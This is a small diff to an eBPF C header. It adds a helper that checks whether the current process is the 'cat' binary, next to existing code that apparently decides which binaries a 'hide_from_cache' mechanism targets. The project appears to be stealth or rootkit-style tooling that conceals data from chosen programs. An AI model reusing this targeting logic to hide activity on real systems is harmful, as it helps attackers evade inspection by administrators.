@@ -9,12 +9,24 @@
 
 #include "bpf_config.h"
 #include "bpf_debug.h"
+#include "../lib/ftlib.h"
 
 /**
  * Nigthmares from Windows...
  */
-static __always_inline void __rtl_secure_zero_memory(void *dst, __u32 size){
+static __always_inline void __rtl_secure_zero_memory(void *dst, __u32 size){ 
     __builtin_memset(dst, 0, size);
+}
+
+/**
+ * Simple helper function to identify if current COMM is the "cat" binary
+ */
+static __always_inline int __is_binary_cat(void) {
+    char comm[TASK_COMM_LEN] = {0};
+    bpf_get_current_comm(comm, sizeof(comm));
+    
+    //32 overkill but ok.
+    return ft_strcmp(comm, CAT_BIN, 32) == 0;
 }
 
 /**
@@ -25,7 +37,7 @@ static __always_inline void __rtl_secure_zero_memory(void *dst, __u32 size){
  * 
  * @return 0 if success, < 0 if error.
  */
-static __always_inline int __resolve_exe_basename(char *dst, size_t sdst){
+static __always_inline int __resolve_exe_basename(char *dst, size_t sdst) {
     struct task_struct *tsk = (void*)bpf_get_current_task();
     if(!tsk)
         return -1;
@@ -48,7 +60,7 @@ static __always_inline int __resolve_exe_basename(char *dst, size_t sdst){
 /**
  * Utility function to check in hide_from_cache has bin target.
  */
-static __always_inline int __is_target_bin(void){
+static __always_inline int __is_target_bin(void) {
     char bin[DNAME_MAX] = {0};
     if(__resolve_exe_basename(bin, sizeof(bin)) < 0)
         return 0;
